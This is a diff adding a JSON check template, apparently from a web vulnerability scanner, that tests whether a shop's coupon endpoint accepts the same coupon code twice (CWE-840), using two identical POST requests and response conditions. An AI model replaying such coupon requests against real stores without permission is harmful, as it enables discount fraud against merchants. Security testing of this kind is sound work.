@@ -1,0 +1,49 @@
+{
+  "name": "web/Single-use coupon accepted on replay",
+  "description": "[high] Proves missing single-use enforcement on coupons: the SAME coupon applies twice with a computed discount both times = economy manipulation primitive (CWE-840). Keywords: business logic coupon reuse single use discount replay commerce. ctrl: already-used coupon 400s on second apply -> not falsified. base_url = coupon apply endpoint.",
+  "cwe": "CWE-840",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/cart/coupon",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"code\":\"c7cpn10\"}"
+    },
+    "replay": {
+      "method": "POST",
+      "url": "{{base_url}}/cart/coupon",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"code\":\"c7cpn10\"}"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "status",
+      "request": "replay",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "replay",
+      "pattern": "\"discount\"",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "e6e6d919414a",
+  "created": "2026-11-06T04:51:35.422905+00:00",
+  "last_used": "2026-11-06T04:51:35.422905+00:00"
+}
